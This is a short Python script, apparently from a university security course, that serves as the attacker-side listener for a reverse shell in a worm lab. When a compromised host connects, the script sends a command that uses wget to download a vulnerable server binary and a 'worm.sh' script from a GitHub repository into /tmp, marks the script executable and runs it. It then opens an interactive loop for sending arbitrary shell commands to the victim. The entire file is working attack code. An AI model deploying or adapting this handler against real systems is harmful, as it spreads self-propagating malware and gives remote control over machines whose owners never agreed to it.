import socket
import time
import subprocess

# Port input
port = int(input("Port: "))

# Reverse shell command
command = (
    # Download vulserver to /tmp/ if not already there
    "wget https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/main/Simpleworm/vulserver "
    "-O /tmp/vulserver; sleep 3; "
    # Download worm.sh to /tmp/ and execute it
    "wget https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/main/Simpleworm/worm.sh "
    "-O /tmp/worm.sh; sleep 3; chmod +x /tmp/worm.sh; /tmp/worm.sh\n"
)

print("[+] Listening on port {}...".format(port))

# Create socket server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", port))
    server_socket.listen(1)

    conn, addr = server_socket.accept()
    print("[+] Get connection from {}:{}".format(addr[0], addr[1]))
    with conn:
        print("[+] Send commands to reverse shell...")
        conn.sendall(command.encode())

        print("[+] Switch to manual interactive mode. Press Ctrl C to exit.")
        try:
            while True:
                user_input = input("$ ")
                if user_input.strip() == "":
                    continue
                conn.sendall((user_input + "\n").encode())
                
                conn.settimeout(0.5)
                response = b""
                try:
                    while True:
                        data = conn.recv(4096)
                        if not data:
                            break
                        response += data
                except socket.timeout:
                    pass

                print(response.decode(errors="ignore"))
        except KeyboardInterrupt:
            print("\n[!] Exited.")